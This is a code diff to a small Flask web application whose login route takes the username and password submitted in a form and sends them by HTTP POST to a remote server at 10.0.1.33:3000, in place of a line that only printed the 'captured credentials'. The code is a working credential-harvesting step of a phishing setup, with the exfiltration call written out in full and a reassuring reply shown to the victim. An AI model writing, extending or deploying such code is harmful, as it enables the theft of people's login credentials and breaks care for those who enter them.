@@ -88,7 +88,21 @@ def serve_asset(filename):
 def login():
     username = request.form['username']
     password = request.form['password']
-    print(f"Captured Credentials - Username: {username}, Password: {password}")
+    
+    # Send captured credentials directly to the remote server (http://10.0.1.33:3000)
+    payload = {
+        'username': username,
+        'password': password
+    }
+    try:
+        response = requests.post("http://10.0.1.33:3000", data=payload)
+        if response.status_code == 200:
+            print(f"Credentials sent to http://10.0.1.33:3000 successfully.")
+        else:
+            print(f"Failed to send credentials. Status code: {response.status_code}")
+    except requests.RequestException as e:
+        print(f"Error sending credentials to the remote server: {e}")
+
     return "Credentials received. Thank you!"
 
 # Start the Flask web server
